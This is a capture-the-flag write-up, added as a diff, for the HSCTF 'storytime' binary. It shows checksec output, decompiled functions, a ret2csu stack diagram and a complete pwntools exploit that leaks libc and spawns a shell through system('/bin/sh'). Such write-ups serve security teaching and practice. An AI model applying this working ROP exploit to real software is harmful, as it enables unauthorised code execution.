@@ -1,0 +1,207 @@
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>I started with checksecing the binary:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/nightmare/storytime$</span> checksec storytime</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/home/eric/nightmare/storytime/storytime&#39;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>       amd64-64-little</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>      Partial RELRO</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>      No canary found</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>         NX enabled</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>        No PIE <span class="er">(</span><span class="ex">0x400000</span><span class="kw">)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stripped:</span>   No</span></code></pre></div>
+<p>We see that <strong>Partial RELRO</strong> is enabled, so we could do
+a GOT overwrite. <strong>NX</strong> is enabled so shellcoding is off
+the table, and there is no canary or PIE in the binary. So ROP or a GOT
+overwrite seem like the angle here.</p>
+<p>I then ran the binary, and provided a large input.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/nightmare/storytime$</span> ./storytime</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">HSCTF</span> PWNNNNNNNNNNNNNNNNNNNN</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Tell</span> me a story: </span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Segmentation</span> fault <span class="er">(</span><span class="ex">core</span> dumped<span class="kw">)</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">pwn</span><span class="kw">)</span> <span class="ex">eric@Eric:~/nightmare/storytime$</span> </span></code></pre></div>
+<p>So there is a buffer overflow. This seems pretty easy…</p>
+<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
+<p>Opened up the binary in ghidra to take a look what I can work with
+here.</p>
+<p><strong>Main function:</strong></p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>undefined8 main<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  undefined1 local_38 <span class="op">[</span><span class="dv">48</span><span class="op">];</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdout<span class="op">,(</span><span class="dt">char</span> <span class="op">*)</span><span class="bn">0x0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="st">&quot;HSCTF PWNNNNNNNNNNNNNNNNNNNN</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="bn">0x1d</span><span class="op">);</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="st">&quot;Tell me a story: </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="bn">0x12</span><span class="op">);</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>  read<span class="op">(</span><span class="dv">0</span><span class="op">,</span>local_38<span class="op">,</span><span class="dv">400</span><span class="op">);</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>A super large overflow in our initial main function to overwrite
+return address. What should we overwrite it with? I looked for a win
+function, but was met with a beginning, middle, climax, and end
+function.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> beginning<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="st">&quot;Once upon a time...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="bn">0x28</span><span class="op">);</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> middle<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="st">&quot;Middle of story is the best! :D</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="bn">0x28</span><span class="op">);</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> climax<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>  undefined1 local_38 <span class="op">[</span><span class="dv">48</span><span class="op">];</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>  read<span class="op">(</span><span class="dv">0</span><span class="op">,</span>local_38<span class="op">,</span><span class="dv">4000</span><span class="op">);</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> end<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="st">&quot;The End!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="bn">0x28</span><span class="op">);</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>So two things we notice here.</p>
+<ol type="1">
+<li><p>There is no <code>puts</code> call, so we can not leak libc with
+<code>puts(puts)</code>. Usually the ideal option when we are working
+with really small binaries with not many of gadgets available to us.
+(Almost always a <code>pop rdi ; ret</code> gadget in every
+binary).</p></li>
+<li><p>There is another huge overflow in the <code>climax</code>
+function.</p></li>
+</ol>
+<h3 id="exploitation-strategy-ret2csu">Exploitation Strategy:
+Ret2CSU</h3>
+<p>So in order to obtain a leak, we can call <code>write</code> on one
+of the GOT entries, but how can we control the registers that we don’t
+have access to? Like <code>rdx</code>?</p>
+<p>There are two approaches, either living off the land (hoping
+<code>rdx</code> is set to a favorable number for us) or we can set
+<code>rdx</code> ourselves. But how?? There is usually no
+<code>pop rdx ; ret</code> gadget in binaries.</p>
+<p>For that, we will use <strong>ret2csu</strong>! Ret2csu is a
+technique where we can populate all of the registers with things we want
+regardless of having access to a <code>pop rdx</code>, or any of the
+gadgets we might need for that matter!</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gef➤</span>  disas __libc_csu_init</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Dump</span> of assembler code for function __libc_csu_init:</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006e0</span> <span class="op">&lt;</span>+64<span class="op">&gt;</span>:    mov    rdx,r15</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006e3</span> <span class="op">&lt;</span>+67<span class="op">&gt;</span>:    mov    rsi,r14</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006e6</span> <span class="op">&lt;</span>+70<span class="op">&gt;</span>:    mov    edi,r13d</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006e9</span> <span class="op">&lt;</span>+73<span class="op">&gt;</span>:    call   QWORD PTR <span class="pp">[</span><span class="ss">r12+rbx*8</span><span class="pp">]</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006fa</span> <span class="op">&lt;</span>+90<span class="op">&gt;</span>:    pop    rbx</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006fb</span> <span class="op">&lt;</span>+91<span class="op">&gt;</span>:    pop    rbp</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006fc</span> <span class="op">&lt;</span>+92<span class="op">&gt;</span>:    pop    r12</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x00000000004006fe</span> <span class="op">&lt;</span>+94<span class="op">&gt;</span>:    pop    r13</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x0000000000400700</span> <span class="op">&lt;</span>+96<span class="op">&gt;</span>:    pop    r14</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x0000000000400702</span> <span class="op">&lt;</span>+98<span class="op">&gt;</span>:    pop    r15</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x0000000000400704</span> <span class="op">&lt;</span>+100<span class="op">&gt;</span>:   ret</span></code></pre></div>
+<p>When we look at the assembly for this function, we see that there is
+a <code>pop rbx, rbp, r12, r13, r14,</code> and <code>r15</code> gadget.
+How can that be useful to us? Right above it, there is
+<code>mov rdx, r15</code>, <code>mov rsi, r14</code>,
+<code>mov edi, r13d</code> and
+<code>call QWORD PTR [r12+rbx*8]</code>.</p>
+<p>That means that we can populate the registers with what we need, and
+call whatever is in <code>r12</code>.</p>
+<p>Here is the stack layout for the Ret2CSU chain:</p>
+<pre><code>       High Addresses
+  +----------------------+
+  |   Padding (56 &#39;A&#39;s)  |  &lt;-- Fills local buffer
+  +----------------------+
+  |       csu_pop        |  &lt;-- Overwrites Return Address (jumps to 0x4006fa)
+  +----------------------+
+  |          0           |  &lt;-- Popped into RBX
+  +----------------------+
+  |          1           |  &lt;-- Popped into RBP (Must be 1 for loop check)
+  +----------------------+
+  |      write_got       |  &lt;-- Popped into R12 (Function to call)
+  +----------------------+
+  |          1           |  &lt;-- Popped into R13 (Moves to EDI -&gt; fd)
+  +----------------------+
+  |       read_got       |  &lt;-- Popped into R14 (Moves to RSI -&gt; buf)
+  +----------------------+
+  |          8           |  &lt;-- Popped into R15 (Moves to RDX -&gt; count)
+  +----------------------+
+  |       csu_call       |  &lt;-- Return Address (jumps to 0x4006e0 to execute call)
+  +----------------------+
+  |          0           |  &lt;-- &quot;add rsp, 0x8&quot; Padding (Skipped after call returns)
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop rbx
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop rbp
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop r12
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop r13
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop r14
+  +----------------------+
+  |          0           |  &lt;-- Junk for pop r15
+  +----------------------+
+  |        climax        |  &lt;-- Final Return Address (Starts Stage 2)
+  +----------------------+
+       Low Addresses</code></pre>
+<p>So our plan of attack is:</p>
+<ol type="1">
+<li><p>Overflow <code>main</code> buffer.</p></li>
+<li><p>Use the CSU pop gadget -&gt; populate the registers with exactly
+what we need.</p></li>
+<li><p>Use the CSU call function to mov everything into
+<code>edi</code>, <code>rsi</code>, and <code>rdx</code>, and call
+<code>write</code>.</p></li>
+<li><p>Finish the execution of CSU by populating the registers correctly
+(padding the cleanup).</p></li>
+<li><p>After this, we get the leak, and then can move on with our second
+overflow, where we have the libc base and call
+<code>system("/bin/sh")</code>.</p></li>
+</ol>
+<h3 id="the-exploit">The Exploit</h3>
+<p>This is the exploit I used to pop a shell:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>e <span class="op">=</span> ELF(<span class="st">&#39;./storytime&#39;</span>)</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>le <span class="op">=</span> e.libc</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(e.path)</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>poprdi <span class="op">=</span> <span class="bn">0x400703</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>ret <span class="op">=</span> <span class="bn">0x40048e</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>climax <span class="op">=</span> e.sym[<span class="st">&#39;climax&#39;</span>]</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>csu_pop <span class="op">=</span> <span class="bn">0x4006fa</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>csu_call <span class="op">=</span> <span class="bn">0x4006e0</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>writegot <span class="op">=</span> e.got[<span class="st">&#39;write&#39;</span>]</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>readgot <span class="op">=</span> e.got[<span class="st">&#39;read&#39;</span>]</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;A&#39;</span> <span class="op">*</span> <span class="dv">56</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(csu_pop)</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="op">+</span> p64(<span class="dv">1</span>) <span class="op">+</span> p64(writegot) <span class="op">+</span> p64(<span class="dv">1</span>) <span class="op">+</span> p64(readgot) <span class="op">+</span> p64(<span class="dv">8</span>) </span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(csu_call)</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="dv">0</span>)</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="op">*</span> <span class="dv">6</span></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(climax)</span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>p.sendafter(<span class="st">b&#39;story: </span><span class="ch">\n</span><span class="st">&#39;</span>, payload)</span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>leak <span class="op">=</span> u64(p.recv(<span class="dv">8</span>))</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>log.info(<span class="ss">f&#39;Leaked read address: </span><span class="sc">{</span><span class="bu">hex</span>(leak)<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>le.address <span class="op">=</span> leak <span class="op">-</span> le.sym[<span class="st">&#39;read&#39;</span>]</span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>log.success(<span class="ss">f&#39;Libc base: </span><span class="sc">{</span><span class="bu">hex</span>(le.address)<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>system <span class="op">=</span> le.sym[<span class="st">&#39;system&#39;</span>]</span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>binsh <span class="op">=</span> <span class="bu">next</span>(le.search(<span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>payload2 <span class="op">=</span> <span class="st">b&#39;A&#39;</span> <span class="op">*</span> <span class="dv">56</span></span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>payload2 <span class="op">+=</span> p64(poprdi)</span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a>payload2 <span class="op">+=</span> p64(binsh)</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>payload2 <span class="op">+=</span> p64(ret)</span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>payload2 <span class="op">+=</span> p64(system)</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a>p.send(payload2)</span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
